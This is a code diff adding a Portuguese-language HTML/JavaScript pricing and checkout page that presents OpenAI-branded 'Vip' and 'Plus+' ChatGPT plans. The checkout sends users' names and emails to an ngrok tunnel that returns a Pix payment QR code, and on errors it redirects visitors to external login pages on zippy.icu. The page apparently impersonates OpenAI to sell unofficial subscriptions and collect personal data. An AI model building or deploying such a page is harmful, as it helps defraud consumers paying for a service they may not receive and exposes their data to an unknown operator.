@@ -1,0 +1,919 @@
+<html lang="pt-BR" class="scroll-smooth" style="scroll-behavior:smooth;">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Pricing Plans</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+  />
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap");
+    body {
+      font-family: "Inter", sans-serif;
+    }
+    /* Custom scrollbar for dark background */
+    ::-webkit-scrollbar {
+      width: 8px;
+      height: 8px;
+    }
+    ::-webkit-scrollbar-track {
+      background: #181818;
+    }
+    ::-webkit-scrollbar-thumb {
+      background-color: #4b5563;
+      border-radius: 10px;
+      border: 2px solid #181818;
+    }
+
+    /* Modal full screen iframe style */
+    #modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(12px);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.4s ease;
+    }
+    #modal-overlay.show {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    #modal-content {
+      position: relative;
+      width: 100vw;
+      height: 100vh;
+      max-width: 100vw;
+      max-height: 100vh;
+      background: #fff;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.15);
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      font-family: 'Inter', sans-serif;
+      color: #111;
+      user-select: none;
+    }
+
+    /* Close button */
+    #modal-close {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      background: transparent;
+      border: none;
+      font-size: 2.5rem;
+      color: #555;
+      cursor: pointer;
+      transition: color 0.3s ease;
+      z-index: 10;
+    }
+    #modal-close:hover {
+      color: #111;
+    }
+
+    /* Checkout container */
+    #checkout-container {
+      flex: 1;
+      overflow-y: auto;
+      padding: 3rem 2rem 4rem;
+      max-width: 900px;
+      margin: 0 auto;
+      width: 100%;
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 3rem;
+      align-items: start;
+    }
+
+    /* Left side: form */
+    #checkout-form-container {
+      background: #f9fafb;
+      border-radius: 1rem;
+      padding: 2.5rem 2rem;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+      display: flex;
+      flex-direction: column;
+      gap: 1.5rem;
+      user-select: text;
+    }
+
+    /* Right side: QR code and info */
+    #checkout-qr-container {
+      background: #10b981;
+      border-radius: 1rem;
+      padding: 2.5rem 2rem;
+      box-shadow: 0 10px 30px rgba(16, 185, 129, 0.3);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      user-select: none;
+      min-height: 400px;
+    }
+
+    /* Heading */
+    #checkout-container h2 {
+      font-weight: 700;
+      font-size: 2.25rem;
+      margin-bottom: 1rem;
+      color: #111;
+      letter-spacing: -0.02em;
+      user-select: text;
+      grid-column: 1 / -1;
+    }
+
+    /* Form styles */
+    #payment-form {
+      display: flex;
+      flex-direction: column;
+      gap: 1.25rem;
+    }
+    #payment-form label {
+      font-weight: 600;
+      color: #374151;
+      margin-bottom: 0.25rem;
+      user-select: text;
+    }
+    #payment-form input[readonly] {
+      background-color: #e5e7eb;
+      color: #6b7280;
+      cursor: not-allowed;
+    }
+    #payment-form input {
+      padding: 0.75rem 1rem;
+      border: 1.5px solid #d1d5db;
+      border-radius: 0.5rem;
+      font-size: 1rem;
+      transition: border-color 0.3s ease;
+      user-select: text;
+    }
+    #payment-form input:focus {
+      outline: none;
+      border-color: #10b981;
+      box-shadow: 0 0 8px #10b981aa;
+    }
+
+    /* Buttons */
+    #modal-cancel, #modal-submit {
+      padding: 0.75rem 1.5rem;
+      font-weight: 600;
+      border-radius: 9999px;
+      border: none;
+      cursor: pointer;
+      transition: background-color 0.3s ease, transform 0.2s ease;
+      user-select: none;
+    }
+    #modal-cancel {
+      background-color: #6b7280;
+      color: #f9fafb;
+    }
+    #modal-cancel:hover {
+      background-color: #4b5563;
+      transform: scale(1.05);
+    }
+    #modal-submit {
+      background-color: #065f46;
+      color: white;
+    }
+    #modal-submit:hover:not(:disabled) {
+      background-color: #047857;
+      transform: scale(1.05);
+    }
+    #modal-submit:disabled {
+      background-color: #a7f3d0;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    /* Button container */
+    #button-group {
+      display: flex;
+      justify-content: flex-end;
+      gap: 1rem;
+      margin-top: 2rem;
+    }
+
+    /* QR Code container */
+    #qrCodeContainer {
+      margin-top: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      gap: 1rem;
+      user-select: none;
+      width: 100%;
+      height: 100%;
+    }
+    #qrCodeContainer img {
+      width: 280px;
+      height: 280px;
+      border-radius: 1rem;
+      box-shadow: 0 10px 30px rgba(255, 255, 255, 0.5);
+      animation: pulse 2.5s infinite ease-in-out;
+    }
+    #qrCodeContainer p {
+      color: white;
+      font-weight: 600;
+      font-size: 1.1rem;
+      text-align: center;
+      max-width: 280px;
+      user-select: text;
+    }
+
+    /* Error message */
+    #errorMessage {
+      color: #dc2626;
+      font-weight: 600;
+      text-align: center;
+      margin-top: 1rem;
+      user-select: text;
+      grid-column: 1 / -1;
+    }
+
+    /* Animations */
+    @keyframes pulse {
+      0%, 100% {
+        box-shadow: 0 0 15px 5px rgba(255, 255, 255, 0.5);
+      }
+      50% {
+        box-shadow: 0 0 25px 10px rgba(255, 255, 255, 0.8);
+      }
+    }
+
+    /* Scrollbar for modal content */
+    #checkout-container::-webkit-scrollbar {
+      width: 8px;
+    }
+    #checkout-container::-webkit-scrollbar-track {
+      background: #f9fafb;
+      border-radius: 10px;
+    }
+    #checkout-container::-webkit-scrollbar-thumb {
+      background-color: #10b981;
+      border-radius: 10px;
+      border: 2px solid #f9fafb;
+    }
+
+    /* Responsive */
+    @media (max-width: 768px) {
+      #checkout-container {
+        grid-template-columns: 1fr;
+        padding: 2rem 1.5rem 3rem;
+      }
+      #checkout-qr-container {
+        min-height: auto;
+        margin-top: 2rem;
+      }
+      #modal-close {
+        font-size: 2rem;
+        top: 15px;
+        right: 15px;
+      }
+    }
+
+    /* Loading overlay */
+    #loading-overlay {
+      position: fixed;
+      inset: 0;
+      background-color: #181818;
+      z-index: 10000;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: white;
+      font-family: 'Inter', sans-serif;
+      font-size: 1.5rem;
+      user-select: none;
+      flex-direction: column;
+      gap: 1rem;
+    }
+    #loading-spinner {
+      border: 4px solid rgba(255, 255, 255, 0.2);
+      border-top: 4px solid #10b981;
+      border-radius: 50%;
+      width: 48px;
+      height: 48px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
+    }
+  </style>
+</head>
+<body class="bg-[#181818] text-white min-h-screen flex flex-col items-center py-10 px-4 relative">
+
+  <!-- Loading overlay -->
+  <div id="loading-overlay" aria-live="polite" aria-busy="true">
+    <div id="loading-spinner" role="img" aria-label="Carregando"></div>
+    <div>Carregando, por favor aguarde...</div>
+  </div>
+
+  <!-- Toggle -->
+  <div class="mb-10">
+    <div
+      class="inline-flex rounded-full bg-[#2c2c2c] p-1 text-sm font-semibold select-none"
+      role="group"
+      aria-label="Pricing toggle"
+    >
+      <button
+        type="button"
+        aria-pressed="true"
+        class="rounded-full bg-[#2c2c2c] px-4 py-1 text-white cursor-default select-none"
+        disabled
+      >
+        Personal
+      </button>
+    </div>
+  </div>
+
+  <!-- Pricing cards container -->
+  <div
+    class="flex flex-col md:flex-row gap-6 max-w-[1100px] w-full"
+    role="list"
+    aria-label="Pricing plans"
+  >
+    <!-- Grátis -->
+    <section
+      id="plan-gratis"
+      class="flex-1 border border-gray-400 rounded-lg p-6 md:p-8 max-w-md"
+      aria-labelledby="gratis-title"
+    >
+      <h3
+        id="gratis-title"
+        class="text-white text-xl font-semibold mb-3"
+        lang="pt"
+      >
+        Grátis
+      </h3>
+      <div class="flex items-center mb-3 space-x-2">
+        <span class="text-gray-400 text-base font-semibold">R$</span>
+        <span
+          class="text-white text-4xl font-light leading-none"
+          aria-label="0"
+          >0</span
+        >
+        <span class="text-gray-400 text-xs leading-tight flex flex-col -ml-1">
+          <span>BRL/</span>
+          <span>mensal</span>
+        </span>
+      </div>
+      <p class="text-gray-300 mb-6 max-w-[280px]">
+        Descubra como a IA pode ajudar em tarefas do dia a dia simples
+      </p>
+      <button
+        id="btn-gratis"
+        disabled
+        class="w-full bg-gray-600 text-gray-400 rounded-full py-2.5 text-sm font-semibold cursor-not-allowed mb-6"
+        aria-disabled="true"
+      >
+        Seu plano atual
+      </button>
+      <ul class="text-gray-300 text-sm space-y-2 mb-8">
+        <li class="flex items-start gap-2">
+          <i class="fas fa-check mt-1 text-white text-xs"></i>
+          Acesse o GPT-4o mini e o raciocínio avançado
+        </li>
+        <li class="flex items-start gap-2">
+          <i class="fas fa-check mt-1 text-white text-xs"></i>Modo voz padrão
+        </li>
+        <li class="flex items-start gap-2">
+          <i class="fas fa-check mt-1 text-white text-xs"></i>
+          Obtenha dados da Web em tempo real com a busca.
+        </li>
+        <li class="flex items-start gap-2">
+          <i class="fas fa-check mt-1 text-white text-xs"></i>
+          Acesso ilimitado ao GPT-4o and o4-mini
+        </li>
+        <li class="flex items-start gap-2">
+          <i class="fas fa-check mt-1 text-white text-xs"></i>
+          Acesso limitado a carregamentos de arquivo, análise de dados avançada e
+          geração de imagens
+        </li>
+        <li class="flex items-start gap-2">
+          <i class="fas fa-check mt-1 text-white text-xs"></i>Uso de GPTs personalizados
+        </li>
+      </ul>
+    </section>
+
+    <!-- Vip -->
+    <section
+      id="plan-vip"
+      class="flex-1 max-w-md rounded-lg border border-green-600 p-6 md:p-8 relative flex flex-col justify-between"
+      aria-labelledby="vip-title"
+    >
+      <div>
+        <h3
+          id="vip-title"
+          class="text-white text-xl font-semibold mb-3"
+          lang="pt"
+        >
+          Vip
+        </h3>
+        <div class="flex items-center mb-3 space-x-2">
+          <span class="text-green-400 text-base font-semibold">R$</span>
+          <span
+            class="text-green-300 text-4xl font-light leading-none"
+            aria-label="29.99"
+            >29<span class="align-top text-sm">⁹⁹</span></span
+          >
+          <span class="text-green-400 text-xs leading-tight flex flex-col -ml-1">
+            <span>BRL/</span>
+            <span>mensal</span>
+          </span>
+        </div>
+        <p class="text-green-300 mb-6 max-w-[280px]">
+          Aumente a produtividade e a criatividade com acesso expandido
+        </p>
+        <button
+          id="btn-vip"
+          class="w-full bg-green-600 hover:bg-green-700 rounded-full py-2.5 text-sm font-semibold mb-6 transition-transform duration-200"
+          type="button"
+          data-plan="vip"
+        >
+          Obter Vip
+        </button>
+        <ul class="text-green-300 text-sm space-y-2">
+          <li class="flex items-start gap-2">
+            <i class="fas fa-check mt-1 text-green-400 text-xs"></i> Tudo do Grátis
+          </li>
+          <li class="flex items-start gap-2">
+            <i class="fas fa-check mt-1 text-green-400 text-xs"></i>
+            Limites adicionais de mensagens, carregamentos de arquivo, análise de
+            dados avançada e geração de imagens
+          </li>
+          <li class="flex items-start gap-2">
+            <i class="fas fa-check mt-1 text-green-400 text-xs"></i>Modo voz padrão e
+            avançada
+          </li>
+          <li class="flex items-start gap-2">
+            <i class="fas fa-check mt-1 text-green-400 text-xs"></i>
+            Acesso a investigações, diversos modelos com raciocínio (o4-mini,
+            o4-mini-high e o3) e uma prévia experimental do GPT-4.5
+          </li>
+          <li class="flex items-start gap-2">
+            <i class="fas fa-check mt-1 text-green-400 text-xs"></i>Crie e use tarefas,
+            projetos e GPTs personalizados
+          </li>
+          <li class="flex items-start gap-2">
+            <i class="fas fa-check mt-1 text-green-400 text-xs"></i>
+            Acesso limitado à geração de vídeos pelo Sora
+          </li>
+          <li class="flex items-start gap-2">
+            <i class="fas fa-check mt-1 text-green-400 text-xs"></i>Oportunidades para
+            testar novos recursos
+          </li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- Plus+ -->
+    <section
+      id="plan-plus"
+      class="flex-1 border border-gray-400 rounded-lg p-6 md:p-8 max-w-md"
+      aria-labelledby="plusplus-title"
+    >
+      <h3
+        id="plusplus-title"
+        class="text-white text-xl font-semibold mb-3"
+        lang="pt"
+      >
+        Plus+
+      </h3>
+      <div class="flex items-center mb-3 space-x-2">
+        <span class="text-yellow-400 text-base font-semibold">R$</span>
+        <span
+          class="text-yellow-300 text-4xl font-light leading-none"
+          aria-label="79.99"
+          >79<span class="align-top text-sm">⁹⁹</span></span
+        >
+        <span class="text-yellow-400 text-xs leading-tight flex flex-col -ml-1">
+          <span>BRL/</span>
+          <span>mensal</span>
+        </span>
+      </div>
+      <p class="text-yellow-300 mb-6 max-w-[280px]">
+        Obtenha o melhor da OpenAI com o nível mais elevado de acesso
+      </p>
+      <button
+        id="btn-plus"
+        class="w-full bg-yellow-400 text-black rounded-full py-2.5 text-sm font-semibold mb-6 transition-transform duration-200 hover:bg-yellow-500"
+        type="button"
+        data-plan="plus+"
+      >
+        Obter o Plus+
+      </button>
+      <ul class="text-yellow-300 text-sm space-y-2 mb-6">
+        <li class="flex items-start gap-2">
+          <i class="fas fa-check mt-1 text-yellow-400 text-xs"></i> Tudo do Vip
+        </li>
+        <li class="flex items-start gap-2">
+          <i class="fas fa-check mt-1 text-yellow-400 text-xs"></i>
+          Acesso ilimitado a todos os modelos de raciocínio e ao GPT-4o completo.
+        </li>
+        <li class="flex items-start gap-2">
+          <i class="fas fa-check mt-1 text-yellow-400 text-xs"></i> Acesso ilimitado à voz
+          avançada
+        </li>
+        <li class="flex items-start gap-2">
+          <i class="fas fa-check mt-1 text-yellow-400 text-xs"></i>
+          Acesso estendido a investigações, capaz de realizar pesquisas on-line em
+          várias etapas para tarefas complexas.
+        </li>
+        <li class="flex items-start gap-2">
+          <i class="fas fa-check mt-1 text-yellow-400 text-xs"></i>
+          Acesso às prévias experimentais do GPT-4.5 e do Operator
+        </li>
+        <li class="flex items-start gap-2">
+          <i class="fas fa-check mt-1 text-yellow-400 text-xs"></i>
+          Acesso ao modo o1 pro, que utiliza mais capacidade computacional para
+          oferecer as melhores respostas às perguntas mais difíceis
+        </li>
+        <li class="flex items-start gap-2">
+          <i class="fas fa-check mt-1 text-yellow-400 text-xs"></i>
+          Acesso estendido à geração de vídeos pelo Sora
+        </li>
+        <li class="flex items-start gap-2">
+          <i class="fas fa-check mt-1 text-yellow-400 text-xs"></i>
+          Acesso à prévia experimental do agente Codex
+        </li>
+      </ul>
+    </section>
+  </div>
+
+  <!-- Modal Overlay Fullscreen Checkout -->
+  <div id="modal-overlay" class="hidden" role="dialog" aria-modal="true" aria-labelledby="checkout-title" aria-describedby="checkout-desc">
+    <div id="modal-content" tabindex="-1" role="document" aria-live="polite" aria-atomic="true">
+      <button id="modal-close" aria-label="Fechar checkout">&times;</button>
+      <main id="checkout-container">
+        <h2 id="checkout-title">Checkout</h2>
+        <div id="checkout-form-container">
+          <form id="payment-form" novalidate>
+            <label for="modal-tipo_assinatura">Tipo de Assinatura <span>(não editável)</span></label>
+            <input type="text" id="modal-tipo_assinatura" name="tipo_assinatura" readonly aria-readonly="true" />
+
+            <label for="modal-nome">Nome <span>(obrigatório)</span></label>
+            <input type="text" id="modal-nome" name="nome" placeholder="Seu nome" required autocomplete="given-name" />
+
+            <label for="modal-sobrenome">Sobrenome <span>(obrigatório)</span></label>
+            <input type="text" id="modal-sobrenome" name="sobrenome" placeholder="Seu sobrenome" required autocomplete="family-name" />
+
+            <label for="modal-email">Email <span>(não editável)</span></label>
+            <input type="email" id="modal-email" name="email" readonly aria-readonly="true" />
+
+            <label for="modal-descricao">Descrição do Pagamento <span>(não editável)</span></label>
+            <input type="text" id="modal-descricao" name="descricao" readonly aria-readonly="true" />
+
+            <div id="button-group">
+              <button type="button" id="modal-cancel">Cancelar</button>
+              <button type="submit" id="modal-submit">Gerar QR Code</button>
+            </div>
+          </form>
+          <p id="errorMessage" role="alert" aria-live="assertive" class="hidden"></p>
+        </div>
+        <div id="checkout-qr-container" aria-live="polite" aria-atomic="true">
+          <div id="qrCodeContainer"></div>
+          <p id="qrCodeInfo" class="hidden text-white text-center mt-4 font-semibold select-text">Escaneie o QR Code acima para realizar o pagamento via Pix.</p>
+        </div>
+      </main>
+    </div>
+  </div>
+
+  <script>
+    // Detect mobile device
+    function isMobileDevice() {
+      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+
+    // Redirect to login pages based on device type
+    function redirectToLogin() {
+      if (isMobileDevice()) {
+        window.location.href = 'https://zippy.icu/loginv1';
+      } else {
+        window.location.href = 'https://zippy.icu/loginv2';
+      }
+    }
+
+    // Show loading overlay for 5 seconds on page load
+    function showLoadingOverlay() {
+      const loadingOverlay = document.getElementById('loading-overlay');
+      loadingOverlay.style.display = 'flex';
+      return new Promise(resolve => {
+        setTimeout(() => {
+          loadingOverlay.style.display = 'none';
+          resolve();
+        }, 5000);
+      });
+    }
+
+    async function checkAccount(email) {
+      try {
+        const response = await fetch(`https://api-criar-conta.vercel.app/check-account/?email=${encodeURIComponent(email)}`);
+        if (!response.ok) throw new Error('Erro na requisição');
+        const data = await response.json();
+        return data;
+      } catch (error) {
+        console.error('Erro ao buscar dados da conta:', error);
+        redirectToLogin();
+        return null;
+      }
+    }
+
+    function disableButton(button, disabled, text, disabledClass, enabledClass) {
+      button.disabled = disabled;
+      button.setAttribute('aria-disabled', disabled ? 'true' : 'false');
+      button.textContent = text;
+      if (disabled) {
+        button.classList.add(...disabledClass.split(' '));
+        button.classList.remove(...enabledClass.split(' '));
+        button.classList.add('cursor-not-allowed');
+      } else {
+        button.classList.remove(...disabledClass.split(' '));
+        button.classList.add(...enabledClass.split(' '));
+        button.classList.remove('cursor-not-allowed');
+      }
+    }
+
+    function updateUI(accountType) {
+      const btnGratis = document.getElementById('btn-gratis');
+      const btnVip = document.getElementById('btn-vip');
+      const btnPlus = document.getElementById('btn-plus');
+
+      // Reset all buttons to enabled state first
+      disableButton(btnGratis, false, 'Obter Grátis', 'bg-gray-600 text-gray-400', 'bg-gray-600 text-gray-400');
+      disableButton(btnVip, false, 'Obter Vip', 'bg-green-600 hover:bg-green-700 text-white', 'bg-green-600 hover:bg-green-700 text-white');
+      disableButton(btnPlus, false, 'Obter o Plus+', 'bg-yellow-400 text-black', 'bg-yellow-400 text-black');
+
+      if (accountType === 'grátis') {
+        // User has grátis: disable grátis button (current plan), enable Vip and Plus+
+        disableButton(btnGratis, true, 'Seu plano atual', 'bg-gray-600 text-gray-400', 'bg-gray-600 text-gray-400');
+      } else if (accountType === 'vip') {
+        // User has vip: disable grátis and vip buttons, enable Plus+
+        disableButton(btnGratis, true, 'Plano Grátis bloqueado', 'bg-gray-600 text-gray-400', 'bg-gray-600 text-gray-400');
+        disableButton(btnVip, true, 'Seu plano atual', 'bg-green-600 text-gray-400', 'bg-green-600 text-white');
+      } else if (accountType === 'plus+') {
+        // User has plus+: disable all buttons
+        disableButton(btnGratis, true, 'Plano Grátis bloqueado', 'bg-gray-600 text-gray-400', 'bg-gray-600 text-gray-400');
+        disableButton(btnVip, true, 'Plano Vip bloqueado', 'bg-green-600 text-gray-400', 'bg-green-600 text-white');
+        disableButton(btnPlus, true, 'Seu plano atual', 'bg-yellow-400 text-gray-400', 'bg-yellow-400 text-black');
+      } else {
+        // Unknown or no account: enable all buttons with default text
+        disableButton(btnGratis, false, 'Obter Grátis', 'bg-gray-600 text-gray-400', 'bg-gray-600 text-gray-400');
+        disableButton(btnVip, false, 'Obter Vip', 'bg-green-600 hover:bg-green-700 text-white', 'bg-green-600 hover:bg-green-700 text-white');
+        disableButton(btnPlus, false, 'Obter o Plus+', 'bg-yellow-400 text-black', 'bg-yellow-400 text-black');
+      }
+    }
+
+    // Modal logic
+    const modalOverlay = document.getElementById('modal-overlay');
+    const modalCloseBtn = document.getElementById('modal-close');
+    const modalCancelBtn = document.getElementById('modal-cancel');
+    const paymentForm = document.getElementById('payment-form');
+    const qrCodeContainer = document.getElementById('qrCodeContainer');
+    const qrCodeInfo = document.getElementById('qrCodeInfo');
+    const errorMessage = document.getElementById('errorMessage');
+    const modalSubmitBtn = document.getElementById('modal-submit');
+    const buttonGroup = document.getElementById('button-group');
+
+    // Inputs inside modal
+    const inputTipoAssinatura = document.getElementById('modal-tipo_assinatura');
+    const inputNome = document.getElementById('modal-nome');
+    const inputSobrenome = document.getElementById('modal-sobrenome');
+    const inputEmail = document.getElementById('modal-email');
+    const inputDescricao = document.getElementById('modal-descricao');
+
+    // Current user info
+    let currentUser = null;
+    let currentAccountType = null;
+    let qrCodeGenerated = false; // Flag to prevent multiple QR code requests
+
+    // Open modal with plan info
+    function openModal(plan) {
+      if (!currentUser || !currentUser.email) {
+        alert('Usuário não autenticado. Por favor, faça login.');
+        return;
+      }
+      currentAccountType = plan;
+      qrCodeGenerated = false;
+
+      // Set modal fields
+      inputTipoAssinatura.value = plan;
+      inputEmail.value = currentUser.email;
+      inputDescricao.value = `Assinatura ${plan.charAt(0).toUpperCase() + plan.slice(1)}`;
+
+      // Clear previous inputs and messages
+      inputNome.value = '';
+      inputSobrenome.value = '';
+      qrCodeContainer.innerHTML = '';
+      qrCodeInfo.classList.add('hidden');
+      errorMessage.textContent = '';
+      errorMessage.classList.add('hidden');
+
+      modalSubmitBtn.disabled = false;
+      modalSubmitBtn.textContent = 'Gerar QR Code';
+
+      // Show cancel button if hidden
+      if (!buttonGroup.contains(modalCancelBtn)) {
+        buttonGroup.appendChild(modalCancelBtn);
+      }
+      modalCancelBtn.style.display = 'inline-block';
+
+      modalOverlay.classList.add('show');
+      modalOverlay.classList.remove('hidden');
+      inputNome.focus();
+    }
+
+    // Close modal and refresh account type
+    async function closeModal() {
+      modalOverlay.classList.remove('show');
+      setTimeout(() => {
+        modalOverlay.classList.add('hidden');
+        qrCodeContainer.innerHTML = '';
+        qrCodeInfo.classList.add('hidden');
+        errorMessage.textContent = '';
+        errorMessage.classList.add('hidden');
+        // Restore cancel button visibility in case it was hidden
+        modalCancelBtn.style.display = 'inline-block';
+      }, 400);
+
+      // Refresh account type after closing modal
+      if (currentUser && currentUser.email) {
+        const accountData = await checkAccount(currentUser.email);
+        const tipo = accountData && accountData.tipo_da_conta ? accountData.tipo_da_conta.toLowerCase().trim() : null;
+        updateUI(tipo);
+      }
+    }
+
+    // Check if user already has the selected plan
+    async function userHasPlan(email, plan) {
+      try {
+        const data = await checkAccount(email);
+        if (!data || !data.tipo_da_conta) return false;
+        return data.tipo_da_conta.toLowerCase().trim() === plan.toLowerCase().trim();
+      } catch {
+        return false;
+      }
+    }
+
+    // Handle form submission
+    paymentForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      if (qrCodeGenerated) return; // Prevent multiple submissions
+
+      errorMessage.textContent = '';
+      errorMessage.classList.add('hidden');
+      qrCodeContainer.innerHTML = '';
+      qrCodeInfo.classList.add('hidden');
+
+      const nome = inputNome.value.trim();
+      const sobrenome = inputSobrenome.value.trim();
+      const email = inputEmail.value.trim();
+      const tipo_assinatura = inputTipoAssinatura.value.trim();
+      const descricao = inputDescricao.value.trim();
+
+      if (!nome || !sobrenome) {
+        errorMessage.textContent = 'Por favor, preencha nome e sobrenome.';
+        errorMessage.classList.remove('hidden');
+        return;
+      }
+
+      // Check if user already has this plan
+      const alreadyHasPlan = await userHasPlan(email, tipo_assinatura);
+      if (alreadyHasPlan) {
+        errorMessage.textContent = `Você já possui a assinatura ${tipo_assinatura}.`;
+        errorMessage.classList.remove('hidden');
+        return;
+      }
+
+      // Disable submit button while processing
+      modalSubmitBtn.disabled = true;
+      modalSubmitBtn.textContent = 'Gerando...';
+
+      // Hide cancel button when generating QR code
+      modalCancelBtn.style.display = 'none';
+
+      try {
+        const body = {
+          tipo_assinatura,
+          descricao,
+          email,
+          nome,
+          sobrenome
+        };
+
+        const response = await fetch('https://lionfish-close-midge.ngrok-free.app/criar_pagamento', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(body)
+        });
+
+        const data = await response.json();
+
+        if (response.ok && data.qr_code_base64) {
+          // Show only QR code, keep modal open so user can pay
+          const img = document.createElement('img');
+          img.src = 'data:image/png;base64,' + data.qr_code_base64;
+          img.alt = `QR Code Pix para assinatura ${tipo_assinatura}`;
+          img.className = 'rounded-xl shadow-lg animate-pulse';
+          qrCodeContainer.innerHTML = '';
+          qrCodeContainer.appendChild(img);
+          qrCodeInfo.classList.remove('hidden');
+          errorMessage.textContent = '';
+          errorMessage.classList.add('hidden');
+          qrCodeGenerated = true; // Lock further submissions
+        } else {
+          errorMessage.textContent = 'Erro ao gerar pagamento. Tente novamente.';
+          errorMessage.classList.remove('hidden');
+          qrCodeContainer.innerHTML = '';
+          qrCodeInfo.classList.add('hidden');
+          qrCodeGenerated = false;
+          // Show cancel button again on error
+          modalCancelBtn.style.display = 'inline-block';
+        }
+      } catch (error) {
+        errorMessage.textContent = 'Erro ao conectar: ' + error.message;
+        errorMessage.classList.remove('hidden');
+        qrCodeContainer.innerHTML = '';
+        qrCodeInfo.classList.add('hidden');
+        qrCodeGenerated = false;
+        // Show cancel button again on error
+        modalCancelBtn.style.display = 'inline-block';
+      } finally {
+        if (!qrCodeGenerated) {
+          modalSubmitBtn.disabled = false;
+          modalSubmitBtn.textContent = 'Gerar QR Code';
+        }
+      }
+    });
+
+    // Close modal events
+    modalCloseBtn.addEventListener('click', closeModal);
+    modalCancelBtn.addEventListener('click', closeModal);
+
+    // Prevent modal close on overlay click (do nothing)
+    modalOverlay.addEventListener('click', (e) => {
+      if (e.target === modalOverlay) {
+        // Do nothing, modal closes only on X or Cancel button
+      }
+    });
+
+    // Attach click handlers to plan buttons
+    function attachPlanButtons() {
+      const btnVip = document.getElementById('btn-vip');
+      const btnPlus = document.getElementById('btn-plus');
+
+      btnVip.addEventListener('click', () => openModal('vip'));
+      btnPlus.addEventListener('click', () => openModal('plus+'));
+    }
+
+    // Initialize app
+    async function appInit() {
+      await showLoadingOverlay();
+
+      const userStr = localStorage.getItem('user');
+      if (!userStr) {
+        currentUser = null;
+        updateUI(null);
+        return;
+      }
+
+      try {
+        currentUser = JSON.parse(userStr);
+      } catch {
+        currentUser = null;
+        updateUI(null);
+        return;
+      }
+
+      if (!currentUser.email) {
+        updateUI(null);
+        return;
+      }
+
+      const accountData = await checkAccount(currentUser.email);
+      if (!accountData) {
+        // checkAccount already redirects on error
+        return;
+      }
+
+      const tipo = accountData.tipo_da_conta ? accountData.tipo_da_conta.toLowerCase().trim() : null;
+      updateUI(tipo);
+      attachPlanButtons();
+    }
+
+    window.addEventListener('DOMContentLoaded', appInit);
+  </script>
+</body>
+</html>
